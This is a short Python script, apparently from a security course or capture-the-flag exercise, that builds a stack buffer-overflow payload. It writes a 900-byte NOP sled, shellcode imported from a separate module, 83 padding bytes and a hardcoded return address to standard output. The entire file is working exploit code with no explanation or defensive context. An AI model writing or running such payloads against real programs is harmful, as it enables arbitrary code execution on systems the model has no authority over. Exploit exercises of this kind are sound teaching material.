import sys
from shellcode import shellcode

sys.stdout.buffer.write(b"\x90" * 900)
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b"\x90" * 83)
sys.stdout.buffer.write(0xFFF6DF50.to_bytes(4, "little"))
